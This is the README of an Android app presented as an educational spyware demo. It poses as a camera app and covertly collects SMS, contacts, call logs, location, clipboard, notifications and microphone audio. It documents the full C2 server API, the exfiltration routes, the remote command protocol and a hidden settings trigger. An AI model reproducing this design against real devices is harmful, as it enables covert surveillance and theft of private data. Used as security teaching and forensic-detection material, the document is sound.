# FancyCam - Educational Android Security & Forensics Demo

A Kotlin-based Android application for teaching Android malware analysis, data collection techniques, C2 protocols, and forensic detection in a **sandboxed lab environment**.

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [C2 Server API Reference (Routes & Methods)](#c2-server-api-reference-routes--methods)
  - [API Route Summary Table](#api-route-summary-table)
  - [Web UI & Health Routes](#web-ui--health-routes)
  - [Device Tracking & Heartbeat Routes](#device-tracking--heartbeat-routes)
  - [Data Exfiltration (Ingestion) Routes](#data-exfiltration-ingestion-routes)
  - [Payload & Media Retrieval Routes](#payload--media-retrieval-routes)
  - [C2 Remote Command & Trigger Routes](#c2-remote-command--trigger-routes)
- [Android App Architecture & Methods](#android-app-architecture--methods)
  - [Outbound Network Endpoints Contacted by App](#outbound-network-endpoints-contacted-by-app)
  - [Inbound C2 Command Protocol](#inbound-c2-command-protocol)
  - [Candidate Endpoint Resolution & Auto-Failover](#candidate-endpoint-resolution--auto-failover)
  - [Class & Method Reference](#class--method-reference)
- [Prerequisites](#prerequisites)
- [Setup & Deployment](#setup--deployment)
- [Web Dashboard Features](#web-dashboard-features)
- [Data Collection Capabilities](#data-collection-capabilities)
- [Exfiltrated Data Payload Schema](#exfiltrated-data-payload-schema)
- [Forensic Detection Points](#forensic-detection-points)
- [Lab Exercises](#lab-exercises)
- [Project Structure](#project-structure)
- [Configuration](#configuration)
- [Hidden Internal Controls & Settings](#hidden-internal-controls--settings)
- [Troubleshooting](#troubleshooting)
- [Disclaimer](#disclaimer)

---

## Overview

FancyCam is a dual-purpose Android application designed for cybersecurity education. On the surface, it functions as a modern, responsive camera application capable of photo capture, lens switching (front/back), flash mode toggling, and local gallery indexing in standard `DCIM/Camera` storage.

Behind this legitimate facade, the app demonstrates common real-world Android surveillance and spyware techniques:
- Background telemetry and hardware/OS fingerprinting
- Content provider harvesting (SMS, Contacts, Call Logs)
- Sensor and radio exploitation (Location, Wi-Fi scans, Cellular details, Microphone eavesdropping)
- Persistent execution across app restarts and reboots via `WorkManager`
- Real-time notification harvesting via `NotificationListenerService`
- Bidirectional C2 communication (periodic heartbeat pings, data exfiltration, remote command execution)
- Hidden diagnostic and configuration controls triggered by long-pressing the app header

**Intended Use:** University courses, cybersecurity workshops, and controlled digital forensics lab environments. **Strictly for educational and authorized research use only.**

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Android Device / Emulator                           │
│                                                                             │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ MainActivity                                                          │  │
│  │  - CameraX preview & high-res capture                                 │  │
│  │  - Runtime permission management (12 permissions)                     │  │
│  │  - WorkManager scheduling (Periodic 15m + One-time upload)             │  │
│  │  - Active heartbeat loop (every 15s via Handler)                      │  │
│  │  - Hidden internal controls trigger (Long-press header → Settings)   │  │
│  └──────────┬────────────────────────────────────────────┬───────────────┘  │
│             │                                            │                  │
│  ┌──────────▼────────────────────────────┐  ┌────────────▼───────────────┐  │
│  │ DataExfilSender                       │  │ Camera & Media Services    │  │
│  │  1. Device fingerprinting             │  │  - CameraHelper (CameraX)  │  │
│  │  2. SMS (content://sms)               │  │  - PhotoStorageManager     │  │
│  │  3. Contacts (ContactsContract)       │  │  - PhotoUploader (Multipart│  │
│  │  4. Call logs (CallLog.Calls)         │  │  - MicrophoneCapture (AAC) │  │
│  │  5. Location (LocationManager)        │  │  - NotificationReader      │  │
│  │  6. Clipboard (ClipboardManager)      │  └────────────┬───────────────┘  │
│  │  7. Wi-Fi scanning (WifiManager)      │               │                  │
│  │  8. Cellular info (TelephonyManager)  │               │                  │
│  │  9. C2 command processor              │               │                  │
│  └──────────┬────────────────────────────┘               │                  │
│             │                                            │                  │
│  ┌──────────▼────────────────────────────────────────────▼───────────────┐  │
│  │ AppConfig & Network Transport (OkHttp)                                │  │
│  │  - Candidate endpoint resolution (127.0.0.1 ↔ 10.0.2.2 fallback)       │  │
│  │  - User-configurable server host & port stored in SharedPreferences   │  │
│  └───────────────────────────────────────┬───────────────────────────────┘  │
└──────────────────────────────────────────┼──────────────────────────────────┘
                                           │ HTTP Requests
                                           │ (adb reverse tcp:5000 tcp:5000)
                                           ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Flask C2 Server (Host)                            │
│                                                                             │
│  Web Dashboard (http://localhost:5000)                                      │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ Left Sidebar: Multi-Device Switcher, Online Indicator, Target Filter  │  │
│  │ Top Bar: C2 Action Buttons (📸 Trigger Photo, 🎙️ Wiretap Audio, Poll)│  │
│  │ Right Tabs: Overview | Devices | SMS | Notifications | Contacts |     │  │
│  │             Calls | Location | WiFi | Clipboard | Audio | Photos | Screens  │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│  Server Routes:                                                             │
│  GET  /                        -> Web UI Dashboard (templates/dashboard)    │
│  GET  /health                  -> Server health status and timestamp        │
│  GET  /api/status              -> Global collection & connected device stats│
│  GET  /api/devices             -> Discovered devices with online/last-seen  │
│  GET  /api/events              -> In-memory audit event log                 │
│  POST /api/heartbeat           -> Device heartbeat check-in & command poll  │
│  POST /exfil/json              -> Receive full JSON telemetry payload       │
│  POST /exfil/screenshot        -> Receive device screenshot image             │
│  POST /exfil/photo             -> Receive camera photo image                  │
│  POST /exfil/audio             -> Receive recorded audio wiretap file       │
│  GET  /api/latest              -> Retrieve latest JSON payload (?device=)   │
│  GET  /api/payloads            -> List all JSON payloads (?device=)         │
│  GET  /api/payload/<path>      -> Fetch specific JSON payload file          │
│  GET  /api/notifications       -> List intercepted notifications (?device=) │
│  GET  /api/screenshots         -> List all screenshot files                 │
│  GET  /api/screenshot/file/<p> -> Serve screenshot image file               │
│  GET  /api/photos              -> List all camera photo files               │
│  GET  /api/photo/file/<p>      -> Serve camera photo image file             │
│  GET  /api/audio               -> List all audio recording files            │
│  GET  /api/audio/file/<path>   -> Serve audio recording file                │
│  GET  /api/commands             -> View pending C2 command queue            │
│  POST /api/trigger/screenshot  -> Queue remote screenshot capture command   │
│  POST /api/trigger/photo       -> Queue remote camera capture command       │
│  POST /api/trigger/audio       -> Queue remote audio wiretap command        │
│                                                                             │
│  Storage Architecture: exfiltrated_data/                                    │
│    └── <android_id>/                                                        │
│        ├── json_data/     -> device_data_<timestamp>.json                   │
│        ├── screenshots/   -> screenshot_<timestamp>.<ext>                    │
│        ├── photos/        -> photo_<timestamp>.<ext>                        │
│        └── audio/         -> audio_<timestamp>.m4a                          │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## C2 Server API Reference (Routes & Methods)

The Python Flask Command & Control server (`flask_c2_server.py`) exposes 19 endpoints handling web UI rendering, device heartbeat monitoring, telemetry ingestion, media storage, and asynchronous C2 command dispatching.

### API Route Summary Table

| Method | Endpoint | Category | Description |
|---|---|---|---|
| `GET` | `/` | Web UI | Renders main operational dashboard |
| `GET` | `/health` | Health | Health probe returning service status |
| `GET` | `/api/status` | Telemetry Stats | Global statistics (payloads, media, devices) |
| `GET` | `/api/devices` | Device Management | List all discovered devices with online status |
| `GET` | `/api/events` | Audit Log | Recent server event log (up to 50 items) |
| `GET` | `/api/commands` | Remote Control | View pending C2 command queue |
| `POST` | `/api/heartbeat` | C2 Heartbeat | Client heartbeat ping and command pickup |

| `POST` | `/exfil/json` | Data Ingestion | Receives structured device telemetry JSON |
| `POST` | `/exfil/screenshot` | Data Ingestion | Receives screenshot image file |
| `POST` | `/exfil/photo` | Data Ingestion | Receives camera photo image file |
| `POST` | `/exfil/audio` | Data Ingestion | Receives recorded microphone audio (.m4a) |
| `GET` | `/api/latest` | Data Retrieval | Retrieves latest JSON payload (device-filterable) |
| `GET` | `/api/payloads` | Data Retrieval | Lists stored JSON payloads with metadata |
| `GET` | `/api/payload/<path>` | Data Retrieval | Returns contents of specific JSON payload |
| `GET` | `/api/notifications` | Data Retrieval | Returns intercepted notifications (device-filterable) |
| `GET` | `/api/screenshots` | Media Retrieval | Lists relative paths of stored screenshots |
| `GET` | `/api/screenshot/file/<path>` | Media Retrieval | Streams specific screenshot image file |
| `GET` | `/api/photos` | Media Retrieval | Lists relative paths of stored camera photos |
| `GET` | `/api/photo/file/<path>` | Media Retrieval | Streams specific camera photo image file |
| `GET` | `/api/audio` | Media Retrieval | Lists relative paths of stored audio files |
| `GET` | `/api/audio/file/<path>` | Media Retrieval | Streams specific audio recording file |
| `POST` | `/api/trigger/screenshot` | Remote Control | Queues remote screenshot capture command |
| `POST` | `/api/trigger/photo` | Remote Control | Queues remote camera photo capture command |
| `POST` | `/api/trigger/audio` | Remote Control | Queues remote audio wiretap command |

---

### Web UI & Health Routes

#### 1. `GET /`
- **Description:** Serves the C2 operator dashboard compiled from `templates/dashboard.html`.
- **Headers:** None.
- **Response:** `200 OK` (Content-Type: `text/html`).

#### 2. `GET /health`
- **Description:** Lightweight health verification endpoint polled by the Android app's `SettingsActivity` to report server connectivity and round-trip latency.
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  {
    "status": "healthy",
    "timestamp": "2026-10-16T00:15:00.000000"
  }
  ```

#### 3. `GET /api/status`
- **Description:** Returns aggregate collection counters, server storage directory path, and connected device counts.
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  {
    "status": "online",
    "timestamp": "2026-10-16T00:15:00.000000",
    "json_received": 14,
    "screenshots_received": 5,
    "audio_received": 2,
    "event_count": 28,
    "storage_path": "/mnt/Work/AndroidStudioProjects/fancycam/exfiltrated_data",
    "devices_total": 2,
    "devices_online": 1
  }
  ```

---

### Device Tracking & Heartbeat Routes

#### 4. `POST /api/heartbeat` (and `GET` if needed for quick checks)
- **Description:** Received from devices every 15 seconds (when foregrounded) or on data collection. Updates device status to online and returns any pending C2 commands queued for the target device.
- **Request Headers:**
  - `Content-Type: application/json`
  - `X-Android-ID: <android_id>` (optional fallback)
  - `User-Agent: FancyCam-Educational/1.0`
- **Request Body:**
  ```json
  {
    "android_id": "9774d56d682e549c",
    "model": "sdk_gphone64_x86_64",
    "brand": "google",
    "manufacturer": "Google",
    "release": "14",
    "sdk_version": 34,
    "timestamp": "2026-10-16T00:15:00.000+0530"
  }
  ```
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  {
    "status": "success",
    "device_status": "online",
    "android_id": "9774d56d682e549c",
    "commands": [
      {
        "action": "take_photo",
        "target": "9774d56d682e549c",
        "timestamp": "2026-10-16T00:14:50.000000"
      }
    ],
    "timestamp": "2026-10-16T00:15:00.123456"
  }
  ```

#### 5. `GET /api/devices`
- **Description:** Aggregates all devices identified through heartbeat check-ins and stored JSON payloads. A device is marked `online` if a heartbeat or payload was received within the last 60 seconds (`ONLINE_THRESHOLD_SECONDS`).
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  [
    {
      "android_id": "9774d56d682e549c",
      "brand": "google",
      "model": "sdk_gphone64_x86_64",
      "manufacturer": "Google",
      "release": "14",
      "sdk_version": "34",
      "is_online": true,
      "status": "online",
      "last_seen": "2026-10-16T00:15:00.000+0530",
      "last_seen_epoch": 1729017900.12,
      "latest_file": "9774d56d682e549c/json_data/device_data_20261016_001400.json",
      "payload_count": 8
    }
  ]
  ```

#### 6. `GET /api/events`
- **Description:** Returns the 50 most recent server events (incoming payloads, file uploads, queued actions, connection errors).
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  [
    {
      "timestamp": "2026-10-16T00:15:02.000000",
      "type": "json",
      "message": "Payload received: 9774d56d682e549c/json_data/device_data_20261016_001502.json",
      "details": {
        "android_id": "9774d56d682e549c",
        "brand": "google",
        "model": "sdk_gphone64_x86_64",
        "contacts_count": 12,
        "call_logs_count": 25,
        "sms_count": 8,
        "wifi_count": 4
      }
    }
  ]
  ```

---

### Data Exfiltration (Ingestion) Routes

#### 7. `POST /exfil/json`
- **Description:** Receives comprehensive device telemetry JSON payload. Saves the payload to `exfiltrated_data/<android_id>/json_data/device_data_<timestamp>.json`. Also updates device check-in info and returns any pending commands for the client.
- **Request Headers:**
  - `Content-Type: application/json`
  - `User-Agent: FancyCam-Educational/1.0`
- **Request Body:** Structured JSON containing `device_info`, `sms_messages`, `contacts`, `call_logs`, `location`, `clipboard`, `wifi_networks`, and `network_info`.
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  {
    "status": "success",
    "message": "Data received",
    "filename": "9774d56d682e549c/json_data/device_data_20261016_001502_123456.json",
    "commands": [],
    "timestamp": "2026-10-16T00:15:02.345678"
  }
  ```

#### 8. `POST /exfil/screenshot` (and `POST /exfil/photo`)
- **Description:** Receives multipart image uploads captured by the camera or screenshot modules.
- **Request Headers:**
  - `Content-Type: multipart/form-data`
  - `X-Android-ID: <android_id>`
  - `User-Agent: FancyCam-Android/1.0`
- **Multipart Form Fields:**
  - `photo` (or `screenshot`, `image`, `file`): Binary image data (JPEG/PNG)
  - `android_id`: Device identifier string
- **Storage Path:** `exfiltrated_data/<android_id>/screenshots/capture_<timestamp>.<ext>`
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  {
    "status": "success",
    "filename": "9774d56d682e549c/screenshots/capture_20261016_001510_654321.jpg",
    "file_size": 245890,
    "timestamp": "2026-10-16T00:15:10.789012"
  }
  ```

#### 9. `POST /exfil/audio`
- **Description:** Receives recorded audio wiretap files (AAC in MPEG-4 container).
- **Request Headers:**
  - `Content-Type: multipart/form-data`
  - `X-Android-ID: <android_id>`
  - `User-Agent: FancyCam-Educational/1.0`
- **Multipart Form Fields:**
  - `audio`: Binary audio file (`.m4a`)
  - `android_id`: Device identifier string (optional form/header)
- **Storage Path:** `exfiltrated_data/<android_id>/audio/audio_<timestamp>.m4a`
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  {
    "status": "success",
    "filename": "9774d56d682e549c/audio/audio_20261016_001540_112233.m4a",
    "file_size": 482014,
    "estimated_duration": "30.1s",
    "timestamp": "2026-10-16T00:15:40.445566"
  }
  ```

---

### Payload & Media Retrieval Routes

#### 10. `GET /api/latest`
- **Description:** Returns the most recent JSON payload. Supports optional device filtering.
- **Query Parameters:** `device=<android_id>` (optional)
- **Response:** `200 OK`
  ```json
  {
    "filename": "9774d56d682e549c/json_data/device_data_20261016_001502.json",
    "file_count": 14,
    "timestamp": "2026-10-16T00:15:02",
    "payload": { ... }
  }
  ```

#### 11. `GET /api/payloads`
- **Description:** Lists all stored JSON telemetry files.
- **Query Parameters:** `device=<android_id>` (optional)
- **Response:** `200 OK`
  ```json
  [
    {
      "filename": "9774d56d682e549c/json_data/device_data_20261016_001502.json",
      "size": 18450,
      "timestamp": "2026-10-16T00:15:02"
    }
  ]
  ```

#### 12. `GET /api/payload/<path:filename>`
- **Description:** Returns the specific JSON payload content identified by relative path.
- **Path Parameter:** `filename` (e.g. `9774d56d682e549c/json_data/device_data_20261016_001502.json`)
- **Response:** `200 OK` with JSON payload, or `404 Not Found`.

#### 13. `GET /api/notifications`
- **Description:** Returns an aggregated list of intercepted notifications across all devices or filtered by device ID.
- **Query Parameters:** `device=<android_id>` (optional filter)
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  [
    {
      "package": "com.whatsapp",
      "title": "Security Team",
      "text": "Password reset requested for administrator account",
      "sub_text": "WhatsApp",
      "timestamp": 1729017370000,
      "is_ongoing": false
    }
  ]
  ```

#### 14. `GET /api/screenshots`
- **Description:** Lists all stored screenshots and photos relative to `exfiltrated_data/`.
- **Response:** `200 OK`
  ```json
  [
    "9774d56d682e549c/screenshots/capture_20261016_001510.jpg"
  ]
  ```

#### 15. `GET /api/screenshot/file/<path:filename>`
- **Description:** Streams the raw image file for rendering in the browser dashboard.
- **Path Parameter:** `filename` (e.g. `9774d56d682e549c/screenshots/capture_20261016_001510.jpg`)
- **Response:** `200 OK` (Content-Type: `image/jpeg` or `image/png`).

#### 16. `GET /api/audio`
- **Description:** Lists all stored audio wiretap files relative to `exfiltrated_data/` with metadata, sorted newest first.
- **Query Parameters:**
  - `device=<android_id>` (optional filter)
  - `format=simple` (optional, returns plain string array)
- **Response:** `200 OK` (Content-Type: `application/json`)
  ```json
  [
    {
      "path": "9774d56d682e549c/audio/audio_20261016_001540.m4a",
      "filename": "audio_20261016_001540.m4a",
      "device_id": "9774d56d682e549c",
      "size": 369089,
      "size_str": "360.4 KB",
      "timestamp": 1729018770000,
      "formatted_time": "2026-10-16 00:15:40",
      "duration_est": "23.1s"
    }
  ]
  ```

#### 17. `GET /api/audio/file/<path:filename>`
- **Description:** Streams the raw `.m4a` audio file for playback in HTML5 audio controls.
- **Path Parameter:** `filename` (e.g. `9774d56d682e549c/audio/audio_20261016_001540.m4a`)
- **Response:** `200 OK` (Content-Type: `audio/mp4`).

---

### C2 Remote Command & Trigger Routes

#### 18. `POST /api/trigger/screenshot`
- **Description:** Queues a remote `take_screenshot` command destined for one or all devices. Next time the target device sends a heartbeat or payload, the command is returned in the response body.
- **Request Body / Query Parameter:**
  ```json
  { "target": "9774d56d682e549c" }
  ```
  *(If omitted or set to `"all"`, applies to any checking-in device)*
- **Response:** `200 OK`
  ```json
  {
    "status": "success",
    "message": "Screenshot capture command queued",
    "timestamp": "2026-10-16T00:16:00.000000"
  }
  ```

#### 19. `POST /api/trigger/audio`
- **Description:** Queues a remote `record_audio` command (30-second wiretap) for a target device.
- **Request Body / Query Parameter:**
  ```json
  { "target": "all" }
  ```
- **Response:** `200 OK`
  ```json
  {
    "status": "success",
    "message": "Audio recording command queued (30 seconds)",
    "timestamp": "2026-10-16T00:16:15.000000"
  }
  ```

---

## Android App Architecture & Methods

### Outbound Network Endpoints Contacted by App

The Android client initiates communication with the C2 server across several background workers and foreground routines:

| Operation | Trigger | Target Endpoint | HTTP Method | Payload Format | Initiating Component |
|---|---|---|---|---|---|
| **Heartbeat Ping** | Every 15s (`onResume`) | `/api/heartbeat` | `POST` | JSON (device specs) | `MainActivity` → `DataExfilSender.sendHeartbeat()` |
| **Comprehensive Exfil** | 5s after startup & WorkManager | `/exfil/json` | `POST` | JSON (full telemetry) | `DataExfilSender.collectAndExfiltrate()` |
| **Immediate Photo Upload** | After each shutter tap | `/exfil/screenshot` | `POST` | Multipart Form (`photo`) | `PhotoUploader.uploadPhoto()` |
| **Notification Interception Exfil** | Real-time on notification received | `/exfil/json` | `POST` | JSON (notification buffer) | `NotificationReaderService.exfiltrateNotification()` |
| **Guaranteed Photo Backup** | WorkManager one-time task | `/exfil/screenshot` | `POST` | Multipart Form (`photo`) | `PhotoUploadWorker` |
| **Audio Wiretap Exfil** | C2 command `record_audio` | `/exfil/audio` | `POST` | Multipart Form (`audio`) | `MicrophoneCapture.exfiltrateAudioFile()` |
| **Health Polling** | Every 4s in Settings | `/health` | `GET` | Empty | `SettingsActivity.checkHealthOnce()` |
| **Connectivity Probe** | On manual test action | `/api/status` | `GET` | Empty | `DataExfilSender.testConnection()` |

---

### Inbound C2 Command Protocol

When the client executes `sendHeartbeat()` or `collectAndExfiltrate()`, the server responds with a JSON object that may contain a `commands` array:

```json
{
  "status": "success",
  "commands": [
    { "action": "take_photo", "target": "all" },
    { "action": "record_audio", "duration": 30000, "target": "all" }
  ]
}
```

The method `DataExfilSender.processServerCommands(context, responseBody)` handles this array:
- **`take_photo`**: Invokes `DataExfilSender.commandListener?.onTakePhotoCommand()`. `MainActivity` runs `takePhotoAndProcess()` on the main thread, taking a picture, updating the viewfinder/thumbnail, saving to `DCIM/Camera`, and transmitting it immediately to `/exfil/screenshot`.
- **`record_audio`**: Calls `MicrophoneCapture.startCaptureAndExfiltrate(context, durationMs)`, initializing `MediaRecorder`, recording AAC audio for the specified duration (default 30s), uploading to `/exfil/audio`, and scrubbing the local file.

---

### Candidate Endpoint Resolution & Auto-Failover

`AppConfig.getCandidateEndpoints(context, path)` provides automatic network resilience between emulator port forwarding and host loopback:

1. **Configured Host**: Reads `server_host` (default `127.0.0.1`) and `server_port` (default `5000`) from SharedPreferences.
2. **Emulator Fallback**:
   - If the configured host is `127.0.0.1`, candidate list includes `http://127.0.0.1:5000<path>` followed by `http://10.0.2.2:5000<path>`.
   - If `adb reverse` is lost or not configured, the network call seamlessly falls back to `10.0.2.2` (the Android emulator's native gateway to the host loopback).
3. **LAN/Wi-Fi Support**: If configured to a LAN IP (e.g. `192.168.1.150`), candidate list targets that address directly.

---

### Class & Method Reference

#### 1. [`AppConfig`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/network/AppConfig.kt) (Singleton)
Centralized configuration manager backed by SharedPreferences (`fancycam_config`).

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `getServerHost` | `context: Context` | `String` | Returns configured server IP/hostname (default: `"127.0.0.1"`) |
| `setServerHost` | `context: Context, host: String` | `Unit` | Saves custom server IP to SharedPreferences |
| `getServerPort` | `context: Context` | `Int` | Returns configured server port (default: `5000`) |
| `setServerPort` | `context: Context, port: Int` | `Unit` | Saves custom server port to SharedPreferences |
| `getBaseUrl` | `context: Context` | `String` | Returns `"http://$host:$port"` |
| `getCandidateEndpoints` | `context: Context, path: String` | `List<String>` | Generates prioritized endpoints with `10.0.2.2` auto-fallback |
| `getPhotoUploadEndpoints` | `context: Context` | `List<String>` | Candidate URLs for `/exfil/screenshot` |
| `getJsonExfilEndpoints` | `context: Context` | `List<String>` | Candidate URLs for `/exfil/json` |
| `getHeartbeatEndpoints` | `context: Context` | `List<String>` | Candidate URLs for `/api/heartbeat` |
| `getHealthEndpoints` | `context: Context` | `List<String>` | Candidate URLs for `/health` |
| `getHealthUrl` | `context: Context` | `String` | Primary configured URL for `/health` |
| `getStatusUrl` | `context: Context` | `String` | Primary configured URL for `/api/status` |

---

#### 2. [`DataExfilSender`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/network/DataExfilSender.kt) (Singleton)
Master data collection engine and telemetry transmitter.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `collectAndExfiltrate` | `context: Context` | `Unit` | Runs master collection on background thread and POSTs JSON to `/exfil/json` |
| `sendHeartbeat` | `context: Context` | `Unit` | Posts device specs to `/api/heartbeat` and executes returned C2 commands |
| `processServerCommands` | `context: Context, responseBody: String` | `Unit` | Deserializes `commands` array and executes `take_photo` / `record_audio` |
| `testConnection` | `context: Context? = null` | `Boolean` | Sends synchronous GET probe to test server reachability |
| `buildDevicePayload` | `context: Context` | `JSONObject` | Extracts Android ID, OS build, brand, manufacturer, fingerprint, installed packages |
| `collectSms` | `context: Context` | `JSONArray` | Queries `content://sms` for message address, body, timestamp, and read status |
| `collectContacts` | `context: Context` | `JSONArray` | Queries `ContactsContract.CommonDataKinds.Phone` for names, numbers, IDs |
| `collectCallLogs` | `context: Context` | `JSONArray` | Queries `CallLog.Calls` for caller name, duration, call type, date |
| `collectLocation` | `context: Context` | `JSONObject` | Queries `LocationManager` for latitude, longitude, altitude, accuracy, provider |
| `collectClipboard` | `context: Context` | `JSONObject` | Accesses `ClipboardManager` to capture primary clipboard text items |
| `collectWifiNetworks` | `context: Context` | `JSONObject` | Gathers connected SSID/BSSID, signal strength, and surrounding scan results |
| `collectNetworkInfo` | `context: Context` | `JSONObject` | Queries `TelephonyManager` for SIM operator, ISO country, network type |
| `sendJson` | `context: Context, json: JSONObject` | `Unit` | Transmits JSON payload with OkHttp, logging event to `AppActivityLogger` |

---

#### 3. [`PhotoUploader`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/network/PhotoUploader.kt) (Singleton)
Handles multipart image uploads to C2 with candidate endpoint retry logic.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `uploadPhoto` | `context: Context?, file: File` | `UploadResult` | Coroutine wrapper (`Dispatchers.IO`) for `uploadPhotoSync` |
| `uploadPhotoSync` | `context: Context?, file: File` | `UploadResult` | Synchronous multipart form upload (`photo`, `android_id`), logging success/failure |

---

#### 4. [`PhotoStorageManager`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/storage/PhotoStorageManager.kt) (Singleton)
Manages public DCIM storage, file naming, and MediaStore gallery indexing.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `createNewPhotoFile` | `context: Context` | `File` | Creates a unique file `IMG_yyyyMMdd_HHmmss.jpg` in `DCIM/Camera` or `Pictures` |
| `getStorageDirectories` | `context: Context` | `List<File>` | Returns prioritized list of writable picture directories on device |
| `indexPhotoInStorage` | `context: Context, file: File, onComplete: (Uri?) -> Unit` | `Unit` | Triggers `MediaScannerConnection` so photo appears in Gallery app |
| `getLatestPhoto` | `context: Context` | `File?` | Returns newest captured JPEG file from storage directories |
| `getAllPhotos` | `context: Context` | `List<File>` | Lists all stored photos sorted descending by modification time |
| `getPhotoDetails` | `file: File` | `PhotoDetails` | Decodes image bounds (width x height), formatted size, and timestamp |

---

#### 5. [`MicrophoneCapture`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/services/MicrophoneCapture.kt) (Singleton)
Records audio wiretap sessions using hardware microphone.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `startCaptureAndExfiltrate` | `context: Context, durationMs: Long = 30000L` | `Unit` | Records AAC audio in MPEG-4 container, POSTs to `/exfil/audio`, and scrubs file |
| `exfiltrateAudioFile` | `context: Context, file: File` | `Unit` | Uploads `.m4a` file with device attribution (`android_id`) over candidate endpoints |
| `stopCapture` | None | `Unit` | Immediately halts and releases `MediaRecorder` instance |
| `isRecording` | None | `Boolean` | Returns whether audio recording is currently active |

---

#### 6. [`CameraHelper`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/camera/CameraHelper.kt)
CameraX wrapper managing camera lifecycle, previews, lens switching, and capture.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `startCamera` | `onReady: () -> Unit, onError: (Exception) -> Unit` | `Unit` | Initializes `ProcessCameraProvider` and binds preview + capture |
| `bindCameraUseCases` | `onReady: () -> Unit, onError: (Exception) -> Unit` | `Unit` | Configures `Preview` and `ImageCapture` use cases for current lens |
| `takePhoto` | `outputFile: File, onPhotoCaptured: (File) -> Unit, onError: (ImageCaptureException) -> Unit` | `Unit` | Captures high-res JPEG to target file with flash/rotation support |
| `toggleCamera` | `onReady: () -> Unit, onError: (Exception) -> Unit` | `Unit` | Flips between `LENS_FACING_FRONT` and `LENS_FACING_BACK` |
| `cycleFlashMode` | None | `Int` | Cycles between `FLASH_MODE_AUTO` → `FLASH_MODE_ON` → `FLASH_MODE_OFF` |
| `isFrontCamera` / `isBackCamera` | None | `Boolean` | State check for current lens orientation |
| `shutdown` | None | `Unit` | Terminates background camera thread executor |

---

#### 7. [`MainActivity`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/ui/MainActivity.kt)
Main application activity providing the camera viewfinder interface.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `onCreate` | `savedInstanceState: Bundle?` | `Unit` | Sets up UI, permissions, camera preview, WorkManager, and long-press header trigger |
| `onResume` | None | `Unit` | Binds C2 command listener and starts 15-second heartbeat handler loop |
| `onPause` | None | `Unit` | Unbinds C2 command listener and pauses heartbeat handler loop |
| `onDestroy` | None | `Unit` | Shuts down camera provider and stops any active microphone recording |
| `checkAndRequestPermissions`| None | `Unit` | Evaluates and requests required runtime permissions |
| `takePhotoAndProcess` | None | `Unit` | Executes capture animation, saves photo, indexes in MediaStore, and uploads |
| `uploadPhotoImmediately` | `file: File` | `Unit` | Launches coroutine for immediate photo upload to `/exfil/screenshot` |
| `enqueueUploadWork` | `file: File` | `Unit` | Enqueues persistent `PhotoUploadWorker` task in WorkManager |
| `schedulePeriodicCollection`| None | `Unit` | Schedules repeating 15-minute `DataCollectionWorker` in WorkManager |

---

#### 8. [`SettingsActivity`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/ui/SettingsActivity.kt)
Hidden internal controls activity accessible by long-pressing the header.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `onCreate` | `savedInstanceState: Bundle?` | `Unit` | Inflates settings UI, populates current IP/port, sets button actions |
| `onResume` / `onPause` | None | `Unit` | Starts / stops 4-second active `/health` polling coroutine |
| `saveConfig` | None | `Boolean` | Validates host/port, saves to `AppConfig`, triggers immediate health test |
| `checkHealthOnce` | None | `Unit` | Sends HTTP GET to `/health`, computes latency, updates health indicator |
| `loadRecentActivities` | None | `Unit` | Renders dynamic activity history cards from `AppActivityLogger` |
| `populatePermissionStatus` | None | `Unit` | Builds runtime/special-permission rows, reports granted/denied status, enables request/settings deep-links |

---

#### 9. [`AppActivityLogger`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/ui/AppActivityLogger.kt) (Singleton)
In-memory and SharedPreferences forensic audit trail logger.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `logActivity` | `context: Context, type: String, title: String, detail: String, success: Boolean` | `Unit` | Appends event item to circular buffer (max 50) in SharedPreferences |
| `getRecentActivities` | `context: Context` | `List<ActivityItem>` | Returns all recorded activity entries with timestamps and status |
| `clearActivities` | `context: Context` | `Unit` | Wipes logged activity history |

---

#### 10. [`NotificationReaderService`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/services/NotificationReaderService.kt)
`NotificationListenerService` implementation harvesting Android system notifications and exfiltrating them to C2.

| Method | Parameters | Return Type | Description |
|---|---|---|---|
| `onNotificationPosted` | `sbn: StatusBarNotification?` | `Unit` | Extracts notification fields, buffers locally, logs to audit trail, and immediately exfiltrates to C2 |
| `onNotificationRemoved` | `sbn: StatusBarNotification?` | `Unit` | Logs dismissal of notifications |
| `onListenerConnected` / `Disconnected` | None | `Unit` | Lifecycle state hooks |
